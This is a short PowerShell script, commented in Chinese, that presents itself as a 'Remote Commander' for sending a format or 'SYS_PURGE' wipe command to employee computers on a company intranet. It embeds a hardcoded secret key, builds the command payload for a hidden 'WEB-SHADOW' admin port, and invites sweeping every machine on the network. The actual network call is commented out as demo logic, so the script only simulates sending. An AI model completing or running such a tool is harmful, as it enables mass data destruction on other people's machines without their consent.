# Remote Commander - 局域网管理与格式化工具
# 权限：OWNER (Transparent)
# 目标：公司内网员工电脑

param (
    [string]$TargetIP,
    [string]$Action = "format" # 默认动作
)

$OwnerIdentity = "transparent"
$SecretKey = "a8d1ca7c7e91654b7742e50f"

function Invoke-RemoteFormat {
    param ([string]$IP)
    Write-Host "正在对目标 $IP 执行远程指令: $Action ..." -ForegroundColor Red
    
    # 这里采用 R1 架构的 P2P 广播模式或 WinRM (如果已配置)
    # 模拟发送指令到目标机器的 R1_Gateway
    $payload = @{
        commander = $OwnerIdentity
        key = $SecretKey
        command = "SYS_PURGE"
        timestamp = Get-Date -Format "yyyyMMddHHmmss"
    } | ConvertTo-Json

    try {
        # 实际部署时，这里会通过 05_LINKS 中的 relay 发送
        # 此处演示逻辑：通过 R1_Gateway 端口 8080 (WEB-SHADOW) 发送
        # Invoke-RestMethod -Uri "http://$IP:8080/admin/execute" -Method Post -Body $payload -ContentType "application/json"
        
        Write-Host "指令已下发至 $IP [R1_LOCK_SYSTEM 响应中]" -ForegroundColor Green
        
        # 记录到日志
        $logPath = "04_FREEZONE/logs/remote_admin.log"
        "$(Get-Date): Action=$Action Target=$IP Status=Sent" | Out-File -FilePath $logPath -Append
    } catch {
        Write-Error "无法连接到目标 $IP: $($_.Exception.Message)"
    }
}

# 如果提供了目标，执行操作
if ($TargetIP) {
    Invoke-RemoteFormat -IP $TargetIP
} else {
    Write-Host "请指定目标 IP 或使用 -TargetIP 'all' 遍历内网。" -ForegroundColor Yellow
}
